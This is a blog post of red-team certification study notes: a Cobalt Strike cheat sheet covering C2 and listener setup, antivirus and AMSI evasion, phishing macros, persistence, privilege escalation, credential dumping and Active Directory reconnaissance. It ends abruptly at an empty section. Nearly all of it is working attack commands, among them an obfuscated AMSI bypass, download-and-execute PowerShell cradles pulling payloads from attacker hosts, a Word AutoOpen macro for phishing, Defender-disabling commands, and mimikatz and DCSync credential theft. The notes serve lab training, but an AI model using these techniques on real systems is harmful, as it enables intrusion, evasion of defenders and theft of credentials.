---
layout: post
title: CRTO Notes Part I
date: 2023-11-15
tags: [Cheatsheet, Study Notes, Zero Point Security]
---
>   Source: [Zero Point Security](https://training.zeropointsecurity.co.uk/courses/red-team-ops)
>
>   **Disclaimer** : This cheat sheet has been compiled from multiple sources with the objective of aiding fellow pentesters and red teamers in their learning. The credit for all the tools and techniques belongs to their original authors. I have added a reference to the original source at the bottom of this document.
>
>   Compiled By : Nikhil Raj ( Twitter: [https://twitter.com/0xn1k5](https://twitter.com/0xn1k5) | Blog: [https://organicsecurity.in](https://organicsecurity.in/) ) and An0nud4y ( Twitter: [https://twitter.com/an0nud4y](https://twitter.com/an0nud4y) | Blog: [https://an0nud4y.com](https://an0nud4y.com) )
>
>   Modified By :  Shiro

### MISC
```powershell
# Change incoming firewall rules
beacon> powerpick Get-NetFirewallRule

# Enable http inbound and outbound connection
beacon> powerpick New-NetFirewallRule -Name "HTTP-Inbound" -DisplayName "HTTP (TCP-In)" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 80
beacon> powerpick New-NetFirewallRule -Name "HTTP-Outbound" -DisplayName "HTTP (TCP-Out)" -Enabled True -Direction Outbound -Protocol TCP -Action Allow -LocalPort 80

# Enable Specific port inbound and outbound connection
# Inbound Rule
beacon> powerpick New-NetFirewallRule -Name "Allow-Port-Inbound" -DisplayName "Allow Inbound Connections to Port 12345" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 4444
# Outbound Rule
beacon> powerpick New-NetFirewallRule -Name "Allow-Port-Outbound" -DisplayName "Allow Outbound Connections to Port 12345" -Enabled True -Direction Outbound -Protocol TCP -Action Allow -RemotePort 4444

# Removing a firewall rule by its name
beacon> powerpick Remove-NetFirewallRule -DisplayName "Test Rule"

# Disabled Real Time Protection / Windows Defender
beacon> powerpick Set-MPPreference -DisableRealTimeMonitoring $true -Verbose
beacon> powerpick Set-MPPreference -DisableIOAVProtection $true -Verbose
beacon> powerpick Set-MPPreference -DisableIntrusionPreventionSystem $true -Verbose

## Encode the powershell payload to base64 for handling extra quotes 
# From Powershell 
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

# From Linux 
$ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0

# Final Command to execute encoded payload
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>

# CobaltStrike AggressorScripts for Persistence
https://github.com/Peco602/cobaltstrike-aggressor-scripts/tree/main/persistence-sharpersist
```

### Command & Control

- Setting up DNS records for DNS based beacon payloads

```bash
# Set below DNS Type A & NS records, where IP points to TeamServer

@    | A  | 10.10.5.50
ns1  | A  | 10.10.5.50
pics | NS | ns1.abc.com

# Verify the DNS configuration from TeamServer, it should return 0.0.0.0
$ dig @ns1.abc.com test.pics.abc.com +short

# Use pics.abc.com as DNS Host and Stager in Listener Configuration
```

- Start the teamserver and run as service

```bash
> sudo ./teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile
```

```bash
$ ip a
$ sudo nano /etc/systemd/system/teamserver.service

[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile

[Install]
WantedBy=multi-user.target

$ sudo systemctl daemon-reload
$ sudo systemctl status teamserver.service
$ sudo systemctl start teamserver.service
$ sudo systemctl enable teamserver.service
```

- Enable Hosting of Web Delivery Payloads via agscript client in headless mode

```bash
$ cat host_payloads.cna

# Connected and ready
on ready {

    # Generate payload
    $payload = artifact_payload("http", "powershell", "x64");

    # Host payload
    site_host("10.10.5.50", 80, "/a", $payload, "text/plain", "Auto Web Delivery (PowerShell)", false);
}

# Add below command in "/etc/systemd/system/teamserver.service" file

ExecStartPost=/bin/sh -c '/usr/bin/sleep 30; /home/attacker/cobaltstrike/agscript 127.0.0.1 50050 headless Passw0rd! host_payloads.cna &'
```

- Custom Malleable C2 Profile for CRTO

```bash
# Custom C2 Profile for CRTO (Modified by an0nud4y)
set sample_name "Dumbledore";
set sleeptime "2000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36";
set host_stage "true";

stage {
        set userwx "false"; #Allocate Beacon DLL as RW/RX rather than RWX.
        set cleanup "true"; #Free memory associated with reflective loader after it has been loaded
        set obfuscate "true"; # Load Beacon into memory without its DLL headers
        set module_x64 "xpsservices.dll"; #Load DLL from disk, then replace its memory with Beacon.
}

post-ex {
        set amsi_disable "true";
        # Malleable C2 amsi_disable does not applies to Cobalt Strike Jump Command (psexec_psh , winrm and winrm64).
				# Read this blog - https://offensivedefence.co.uk/posts/making-amsi-jump/
				
				set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
				#set spawnto_x64 "%windir%\\System32\\dllhost.exe";
        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
				
}

http-get {
	set uri "/cat.gif /image /pixel.gif /logo.gif";

	client {
        	# customize client indicators
		header "Accept" "text/html,image/avif,image/webp,*/*";
		header "Accept-Language" "en-US,en;q=0.5";
		header "Accept-Encoding" "gzip, deflate";
		header "Referer" "https://www.google.com";

		parameter "utm" "ISO-8898-1";
		parameter "utc" "en-US";

		metadata{
			base64;
			header "Cookie";
		}
	}

	server {
		# customize server indicators
		header "Content-Type" "image/gif";
		header "Server" "Microsoft IIS/10.0";	
		header "X-Powered-By" "ASP.NET";	

		output{
			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
      prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
      prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
			print;
		}
	}
}

http-post {
	set uri "/submit.aspx /finish.aspx";

	client {

		header "Content-Type" "application/octet-stream";
		header "Accept" "text/html,image/avif,image/webp,*/*";
		header "Accept-Language" "en-US,en;q=0.5";
		header "Accept-Encoding" "gzip, deflate";
		header "Referer" "https://www.google.com";
		
		id{
			parameter "id";
		}

		output{
			print;
		}

	}

	server {
		# customize server indicators
		header "Content-Type" "text/plain";
		header "Server" "Microsoft IIS/10.0";	
		header "X-Powered-By" "ASP.NET";	

		output{
			netbios;
			prepend "<!DOCTYPE html><html><head><title></title></head><body><h1>";
			append "</h1></body></html>";
			print;
		}
	}
}

http-stager {

	server {
		header "Content-Type" "application/octet-stream";
		header "Server" "Microsoft IIS/10.0";	
		header "X-Powered-By" "ASP.NET";
	}
}
```

### Setup Listeners

- Setting up the SMB Listener
    - Default pipe name is quite well signatured.  A good strategy is to emulate names known to be used by common applications or Windows itself.
    - Use `PS C:\> ls \\.\pipe\` to list all currently listening pipes for inspiration.
        - `TSVCPIPE-4036c92b-65ae-4601-1337-57f7b24a0c57`
    
- Setting up Pivot Listener
    - `Beacon_reverse_tcp` and `Beacon_Bind_Tcp` both are different type of Listeners.
    - Pivot Listeners can only be created from a beacon.
    - Steps to create a Pivot Listener
        - Click on the Beacon Host
        - Select Pivoting > Listener and Give it a Name and leave other options untouched (modify if required)
        - Now in the Beacon Host machine you can check that is Beacon Process has a opened Port
            - `netstat -anop tcp | findstr <PORT>` where port is the pivot listener port
        - Now go to the payloads and generate any payload and select the `beacon_reverse_tcp` as payload listener.
        

### Defender Antivirus / AMSI

```powershell
# Modifying Aritfact Kit 
# Modify script_template.cna and replace all instances of rundll32.exe with dllhost.exe
PS > $template_path="C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\script_template.cna" ; (Get-Content -Path $template_path)  -replace 'rundll32.exe' ,  'dllhost.exe' | Set-Content -Path $template_path

# Compile the Artifact kit (From WSL in Attacker windows Machine)
$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
$ ./build.sh pipe VirtualAlloc 296948 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
# Other Techniques are : mailslot, peek , pipe, readfile, readfile-v2
# Now load the artifact kit in cobalt strike (Cobalt Strike > Script Manager > Load)
# Now generate the payloads and test if these are getting detected, if they are detected by ThreatCheck , Follow the notes to modify the artifact kit code.

# Resource Kit - Compile the resource kit
$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource && ./build.sh /mnt/c/Tools/cobaltstrike/resources

# Elevate Kit
# Load Elevate kit in cobalt strike (manually or from script console)
aggressor> load C:\Tools\cobaltstrike\elevate-kit\elevate.cna

# To test AMSI, use the AMSI Test Sample PowerShell cmdlet.
# "The term 'AMSI' is not recognised" refers that AMSI is not enabled, So either AMSI Bypass is working or Defender is not enabled.
Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'

# To test on-disk detections, drop the EICAR test file somewhere such as the desktop.
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*

# Verify if the payload is AV Safe
PS> ThreatCheck.exe -f C:\Payloads\smb_x64.svc.exe -e AMSI
PS> ThreatCheck.exe -f C:\Payloads\http_x64.exe -e AMSI

# One Liner to test all payloads for AV safe
PS> Get-ChildItem -Path "C:\Payloads\" -File | ForEach-Object { & echo "Testing file against ThreatCheck (AMSI): $_" ; ThreatCheck.exe -e AMSI -f $_.FullName }

# Load the CNA file: Cobalt Strike > Script Manager > Load > and select the CNA
# Use Payloads > Windows Stageless Generate All Payloads to replace all of your payloads in `C:\Payloads`

# Disable AMSI in Malleable C2 profile
$ vim c2-profiles/normal/webbug.profile

# Right above the `http-get` block, add the following:
post-ex {
        set amsi_disable "true";
				set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
				#set spawnto_x64 "%windir%\\System32\\dllhost.exe";
        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
}

# Minimize the Behavioural Detections by modifying the Malleable c2 Profile
stage {
        set userwx "false"; #Allocate Beacon DLL as RW/RX rather than RWX.
        set cleanup "true"; #Free memory associated with reflective loader after it has been loaded
        set obfuscate "true"; # Load Beacon into memory without its DLL headers
        set module_x64 "xpsservices.dll"; #Load DLL from disk, then replace its memory with Beacon.
}

# Verify the modified C2 profile
attacker@ubuntu ~/cobaltstrike> ./c2lint c2-profiles/normal/webbug.profile

# Creating custom C2 profiles
https://unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/

# Note: `amsi_disable` only applies to `powerpick`, `execute-assembly` and `psinject`.  It **does not** apply to the powershell command.

# Behaviour Detections (change default process for fork & run)
beacon> spawnto x64 %windir%\System32\taskhostw.exe
beacon> spawnto x86 %windir%\syswow64\dllhost.exe

beacon> spawnto x64 %windir%\System32\dllhost.exe
beacon> spawnto x86 %windir%\syswow64\dllhost.exe
beacon> powerpick Get-Process -Id $pid | select ProcessName

# Change the default process for psexec
beacon> ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
beacon> ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe

# Disable Defender from local powershell session
Get-MPPreference
Set-MPPreference -DisableRealTimeMonitoring $true
Set-MPPreference -DisableIOAVProtection $true
Set-MPPreference -DisableIntrusionPreventionSystem $true
```

##### ASMI Bypass

```powershell
# AMSI BYPASS :  Use AMSI Bypass with above payload if required, 
# Save below one liner to a ps1 file and host it on cobalt strike and use Powershell IEX to fetch and run it in memory to bypass AMSI.

S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Like below, It can also be combined with above Macro

Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/amsi-bypass.ps1')) ; IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""

# Powershell Execute cradles
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')

powershell.exe -nop -w hidden -c "iex (iwr http://nickelviper.com/amsi-bypass.ps1 -UseBasicParsing)"

$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.X.Y/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

# PSv3 onwards
iex (iwr 'http://192.168.X.Y/evil.ps1')

$h=New-Object -ComObject Msx ml2.XMLHTTP;$h.open('GET','http://192.168.X.Y/evil.ps1',$false);$h.send();iex $h.responseText

$wr = [System.NET.WebRequest]::Create("http://192.168.X.Y/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

### Initial Compromise

- Enumerating OWA to identify valid user and conducting password spraying attack

```powershell
# Identify the mail server of given domain
$ dig cyberbotic.io
$ ./dnscan.py -d cyberbotic.io -w subdomains-100.txt

# Idenitfy the NETBIOS name of target domain
ps> ipmo MailSniper.ps1
ps> Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io

# Extract Employee Names (FirstName LastName) and Prepare Username List
$ ~/namemash.py names.txt > possible.txt

# Validate the username to find active/real usernames
ps> Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt

# Conduct Password Spraying attack with known Password on identified users
ps> Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022

# Use Identified credentials to download Global Address List
ps> Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt
```

- Create a malicious Office file having embedded macro

```powershell
# Step 1: Open a blank word document "Document1". Navigate to  View > Macros > Create. Changes macros in to Document1. Name the default macro function as AutoOpen. Paste the below content and run for testing

Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "notepad"

End Sub

# Step 2: Generate a payload for web delivery (Attacks > Scripted Web Delivery (S) and generate a 64-bit PowerShell payload with your HTTP/DNS listener). Balance the number of quotes

Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
	Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""

End Sub

# Step 3: Save the document as .doc file and send it as phising email
```

### Host Reconnaissance

```powershell
# Identify running process like AV, EDR or any monitoring and logging solution
beacon> ps

# Check default process for fork & run
beacon> powerpick Get-Process -Id $pid | select ProcessName

# Use Seatbealt to enumerate about system
beacon> execute-assembly Seatbelt.exe -group=system

# Screenshot, Clipboard, Keylogger and User Sessions of currently logged in user
beacon> screenshot
beacon> clipboard
beacon> net logons
beacon> keylogger
beacon> job
beacon> jobkill 3
```

### Host Persistence (Normal + Privileged)

```powershell
# Default location for powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell

# Encode the payload for handling extra quotes 

# Powershell
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://10.0.0.0/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

#Linux 
$ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.0.0.0/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0

# Final Command
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>

# ---------------------------------------------------------------------------------

# Common userland persistence methods include - HKCU/HKLM Registry Autoruns, Scheduled Tasks, Startup Folder

# CobaltStrike AggressorScripts for Persistence
# Copy the aggressor script cna code and paste in the Attacker machine and also copy the sharpersist.exe from Attacker machine Tools and put in the same directory as of persistence cna file.
https://github.com/Peco602/cobaltstrike-aggressor-scripts/tree/main/persistence-sharpersist
```

##### Persistence - Task Scheduler (hourly)

```powershell
beacon> execute-assembly SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <BASE64_ENCODED_PAYLOAD>" -n "Updater" -m add -o hourly
```

##### Persistence - Logon (Need Admin Privileges)

```powershell
beacon> execute-assembly SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <BASE64_ENCODED_PAYLOAD>" -n "Updater" -m add -o logon
```

##### Persistence - Startup Folder

```powershell
PS C:\> $str = "IEX ((new-object net.webclient).downloadstring('http://10.0.0.0/amsi-bypass.ps1')) ; IEX ((new-object net.webclient).downloadstring('http://10.0.0.0/a'))"
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

beacon> execute-assembly SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <BASE64_ENCODED_PAYLOAD>" -f "UserEnvSetup" -m add 
```

##### Persistence - Registry Autorun

```powershell
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe Updater.exe
beacon> execute-assembly SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```

##### Persistence Component Object Model (COM) Hijacks

```powershell
# Hunting for COM Hijacks
# We can use Process Monitor and then filter for RegOpenKey operations, NAME NOT FOUND in result, and path ends with InprocServer32.
# Note: Look for COM that are loaded semi-frequently, or with a commonly-used application like Word or Excel

# Eg: lets say we found this HKCU\Software\Classes\CLSID\[ABC-123]\InprocServer32

# We can then check if it exists in HKLM but not HKCU
PS C:\> Get-Item -Path "HKLM:\Software\Classes\CLSID\[ABC-123]\InprocServer32"
PS C:\> Get-Item -Path "HKCU:\Software\Classes\CLSID\[ABC-123]\InprocServer32"

# Finally we can create the necessary registry entries in HKCU and point to our Beacon DLL
PS C:\> New-Item -Path "HKCU:Software\Classes\CLSID" -Name "[ABC-123]"
PS C:\> New-Item -Path "HKCU:Software\Classes\CLSID\[ABC-123]" -Name "InprocServer32" -Value "C:\beacon.dll"
PS C:\> New-ItemProperty -Path "HKCU:Software\Classes\CLSID\[ABC-123]\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

##### Persistence - Privileged System User

```powershell
# Windows Service
beacon> cd C:\Windows
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe legit-svc.exe
beacon> execute-assembly SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add

# Register WMI event to trigger our payload
beacon> cd C:\Windows
beacon> upload C:\Payloads\dns_x64.exe
beacon> powershell-import PowerLurk.ps1
beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe

# TIP : Use a beacon with slow check-in and spawn a new Session from it , So that it can be later used as lifeline.
beacon> spawn x64 http
beacon> inject 4464 x64 http

# Create a new Session (child of current process) using spawn or shspawn.
beacon> spawn x64 http
beacon> shspawn x64 C:\Payloads\msf_http_x64.bin

# Inject a full Beacon payload for the specified listener using inject or shinject.
beacon> inject 4464 x64 tcp-local
beacon> execute C:\Windows\System32\notepad.exe
beacon> ps
beacon> shinject <PID> x64 msf.bin
```

### Host Privilege Escalation

```powershell
# Query and manage all the installed services
beacon> powershell Get-Service | fl
beacon> run wmic service get name, pathname
beacon> run sc query
beacon> run sc qc VulnService2
beacon> run sc stop VulnService1
beacon> run sc start VulnService1

# Use SharpUp to find exploitable services
beacon> execute-assembly SharpUp.exe audit 

# UAC Bypass
beacon> run whoami /groups
beacon> elevate uac-schtasks tcp-local
beacon> elevate svc-exe tcp-4444-local
beacon> run netstat -anop tcp
beacon> connect localhost 4444
```

##### Case 1: Unquoted Service Path (Hijack service binary search logic to execute our payload)

```powershell
beacon> execute-assembly SharpUp.exe audit UnquotedServicePath
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
beacon> cd C:\Program Files\Vulnerable Services
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe Service.exe
beacon> run sc stop VulnService1
beacon> run sc start VulnService1
beacon> connect localhost 4444
```

##### Case 2: Weak Service Permission (Modify service configuration)

```powershell
beacon> execute-assembly SharpUp.exe audit ModifiableServices
beacon> powershell-import Get-ServiceAcl.ps1
beacon> powershell Get-ServiceAcl -Name VulnService2 | select -expand Access

beacon> run sc qc VulnService2
beacon> mkdir C:\Temp
beacon> cd C:\Temp
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
beacon> run sc qc VulnService2
beacon> run sc stop VulnService2
beacon> run sc start VulnService2

beacon> connect localhost 4444
```

##### Case 3: Weak Service Binary Permission (Overwrite the service binary due to weak permission)

```powershell
beacon> execute-assembly SharpUp.exe audit ModifiableServices
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl

PS C:\Payloads> copy "tcp-local_x64.svc.exe" "Service 3.exe"
beacon> run sc stop VulnService3
beacon> cd "C:\Program Files\Vulnerable Services"
beacon> upload C:\Payloads\Service 3.exe
beacon> run sc start VulnService3
beacon> connect localhost 4444
```

### Credential Theft

```powershell
# "!" symbol is used to run command in elevated context of System User
# "@" symbol is used to impersonate beacon thread token

# Dump TGT/TGS Tickets
beacon> mimikatz !sekurlsa::tickets
beacon> execute-assembly Rubeus.exe triage
beacon> execute-assembly Rubeus.exe dump /luid:0x14794e /nowrap
beacon> execute-assembly Rubeus.exe monitor /interval:10 /nowrap

# Dump the local SAM database 
beacon> mimikatz !lsadump::sam

# Dump the logon passwords (plaintext + hashes) from lsass.exe for currently logged on users
beacon> mimikatz !sekurlsa::logonpasswords

# Dump the encryption keys used by Kerberos of logged on users
beacon> mimikatz !sekurlsa::ekeys

# Dump Domain Cached Credentials
beacon> mimikatz !lsadump::cache

# List the kerberos tickets cached in current logon session or all logon session (privileged session)
beacon> execute-assembly Rubeus.exe triage

# Dump the TGT Ticket from given Logon Session (LUID)
beacon> execute-assembly Rubeus.exe dump /luid:0x7049f /service:krbtgt

# DC Sync
beacon> make_token DEV\nlamb F3rrari
beacon> dcsync dev.cyberbotic.io DEV\krbtgt
beacon> mimikatz !lsadump::dcsync /all /domain:dev.cyberbotic.io

# Dump krbtgt hash from DC (locally)
beacon> mimikatz !lsadump::lsa /inject /name:krbtgt
```

### Domain Recon

##### `PowerView`

```powershell
# Load Powerview powershell script in Beacon Session (Cobalt Strike)
beacon> powershell-import PowerView.ps1

# Get Domain Information
beacon> powerpick Get-Domain -Domain <>

# Get Domain SID
beacon> powerpick Get-DomainSID

# Get Domain Controller
beacon> powerpick Get-DomainController | select Forest, Name, OSVersion | fl

# Get Forest Information
beacon> powerpick Get-ForestDomain -Forest <>

# Get Domain Policy 
beacon> powerpick Get-DomainPolicyData | select -expand SystemAccess

# Get Domain users
beacon> powerpick Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl

# Identify Kerberoastable/ASEPRoastable User/Uncontrained Delegation
beacon> powerpick Get-DomainUser | select cn,serviceprincipalname
beacon> powerpick Get-DomainUser -PreauthNotRequired
beacon> powerpick Get-DomainUser -TrustedToAuth

# Get Domain Computer
beacon> powerpick Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName

# Idenitify Computer Accounts where unconstrained and constrained delegation is enabled
beacon> powerpick Get-DomainComputer -Unconstrained | select cn, dnshostname
beacon> powerpick Get-DomainComputer -TrustedToAuth | select cn, msdsallowedtodelegateto

# Get Domain OU
beacon> powerpick Get-DomainOU -Properties Name | sort -Property Name

# Identify computers in given OU
beacon> powerpick Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName

# Get Domain group (Use -Recurse Flag)
beacon> powerpick Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName

# Get Domain Group Member
beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select MemberDistinguishedName

# Get Domain GPO
beacon> powerpick Get-DomainGPO -Properties DisplayName | sort -Property DisplayName

# Find the System where given GPO are applicable
beacon> powerpick Get-DomainOU -GPLink "{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}" | select distinguishedName

# Idenitfy domain users/group who have local admin via Restricted group or GPO 
beacon> powerpick Get-DomainGPOLocalGroup | select GPODisplayName, GroupName

# Enumerates the machines where a specific domain user/group has local admin rights
beacon> powerpick Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl

# Get Domain Trusts
beacon> powerpick Get-DomainTrust

# Find interesting ACLs
beacon> powerpick Find-InterestingDomainAcl -ResolveGUIDs


# Find Local Admin Access on other domain computers based on context of current user
beacon> powerpick Find-LocalAdminAccess -Verbose
beacon> powerpick Invoke-CheckLocalAdminAccess -ComputerName <server_fqdn>
# Not available in Powerview , need scripts Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1
beacon> powerpick Find-PSRemotingLocalAdminAccess -ComputerName <server_fqdn>
beacon> powerpick Find-WMILocalAdminAccess -ComputerName <server_fqdn>

# Check for computers where users or domain admin may have logged in sessions
# Find computers where a domain admin (or specified user/group) has sessions
beacon> powerpick Find-DomainUserLocation -Verbose
beacon> powerpick Find-DomainUserLocation -UserGroupIdentity "Domain Users"

# Find computers where a domain admin session is available and current user has admin access (uses `Test-AdminAccess`). -CheckAccess Flag Sometimes not gives accurate results with Find-DomainUserLocation , So use Invoke-UserHunter.
beacon> powerpick Invoke-UserHunter -CheckAccess
beacon> powerpick Find-DomainUserLocation -CheckAccess

# Find computers (File Servers and Distributed File servers) where a domain admin session is available.
beacon> powerpick Find-DomainUserLocation –Stealth
beacon> powerpick Invoke-StealthUserHunter

# Finds machines on the local domain where specified users are logged into, and can optionally check if the current user has local admin access to found machines
beacon> powerpick Invoke-UserHunter -CheckAccess

# Finds all file servers utilizes in user HomeDirectories, and checks the sessions one each file server, hunting for particular users    
beacon> powerpick Invoke-StealthUserHunter

# Hunts for processes with a specific name or owned by specific user on domain machines
beacon> powerpick Invoke-ProcessHunter
# Hunts for user logon events in domain controller event logs
beacon> powerpick Invoke-UserEventHunter

# Find shares on hosts in current domain.
beacon> powerpick Invoke-ShareFinder –Verbose
# Find sensitive files on computers in the domain
beacon> powerpick Invoke-FileFinder -Verbose
# Get all fileservers of the domain
beacon> powerpick Get-NetFileServer
```

##### `SharpView` 

```powershell
beacon> execute-assembly SharpView.exe Get-Domain
```

##### `ADSearch`

```powershell
beacon> execute-assembly ADSearch.exe --search "objectCategory=user"

beacon> execute-assembly ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins*))"

beacon> execute-assembly ADSearch.exe --search "(&(objectCategory=group)(cn=MS SQL Admins))" --attributes cn,member

# Kerberostable Users
beacon> execute-assembly ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

# ASEPROAST
beacon> execute-assembly ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

# Unconstrained Delegation
beacon> execute-assembly ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

# Constrained Delegation
beacon> execute-assembly ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

# Additionally, the `--json` parameter can be used to format the output in JSON
```

##### `SharpHound`

```powershell
beacon> execute-assembly SharpHound.exe -c DcOnly

beacon> execute-assembly SharpHound.exe -c DcOnly -d cyberbotic.io

beacon> download XYZ_BloodHound.zip
```

### User Impersonation

##### Pass The Hash Attack (PTH)

```powershell
beacon> getuid
beacon> ls \\web.dev.cyberbotic.io\c$
beacon> run klist # find luid

# PTH using inbuild method in CS (internally uses Mimikatz)
beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c

# Find Local Admin Access
beacon> powerpick Find-LocalAdminAccess

beacon> rev2self
```

##### Pass The Ticket Attack (PTT)

```powershell
# Create a sacrificial token with dummy credentials
beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123

# Inject the TGT ticket into logon session returned as output of previous command
beacon> execute-assembly Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj...DLklP

# OR Combine above 2 steps in one
beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123 /ticket:doIFuj...lDLklP 

beacon> steal_token 4748
beacon> token-store steal 4748

# Now check access by trying to list the c: drive
beacon> ls \\web.dev.cyberbotic.io\c$
```

##### OverPassTheHash (OPTH)

```powershell
